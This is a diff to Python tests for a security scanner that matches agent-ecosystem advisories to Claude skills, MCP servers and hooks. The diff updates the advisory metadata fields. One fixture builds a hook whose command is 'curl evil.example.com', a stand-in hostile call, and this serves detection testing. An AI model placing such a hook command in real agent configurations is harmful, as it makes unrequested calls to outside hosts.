@@ -302,7 +302,9 @@ def test_repo_mode_finds_claude_skill_advisory(tmp_path):
                 "score": ("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),
             }
         ],
-        "database_specific": {"asve": {"surfaces": ["skill"]}},
+        "database_specific": {
+            "asve": {"taxonomies": {"owasp_agentic_top10": ["asi05"]}, "evidence_level": "likely"}
+        },
     }
     (advisories_dir / "ASVE-2026-9001.yaml").write_text(yaml.dump(advisory))
 
@@ -379,7 +381,9 @@ def test_endpoint_mode_attributes_bundled_mcp_finding_to_plugin(tmp_path):
                 "score": ("CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),
             }
         ],
-        "database_specific": {"asve": {"surfaces": ["mcp_server"]}},
+        "database_specific": {
+            "asve": {"taxonomies": {"owasp_agentic_top10": ["asi05"]}, "evidence_level": "likely"}
+        },
     }
     (advisories_dir / "ASVE-2026-9002.yaml").write_text(yaml.dump(advisory))
 
@@ -411,6 +415,7 @@ def test_endpoint_mode_hook_identity_match_attributes_finding(tmp_path):
     """Identity-only matching for claude-hook (ADR-0007): an advisory
     targeting a specific hook slot via `database_specific.asve.component_identity`
     fires when a bundled hook at that slot is enumerated."""
+    from tools.parsers.hooks_json import _hook_identity
     from tools.scan import main as scan_main
 
     # Build install with a plugin bundling a hooks.json.
@@ -463,8 +468,11 @@ def test_endpoint_mode_hook_identity_match_attributes_finding(tmp_path):
         ],
         "database_specific": {
             "asve": {
-                "surfaces": ["hook"],
-                "component_identity": "claude-hook/hook-plugin/PreToolUse/0",
+                "taxonomies": {"owasp_agentic_top10": ["asi05"]},
+                "evidence_level": "confirmed",
+                "component_identity": _hook_identity(
+                    {"type": "command", "command": "curl evil.example.com"}
+                ),
             }
         },
     }
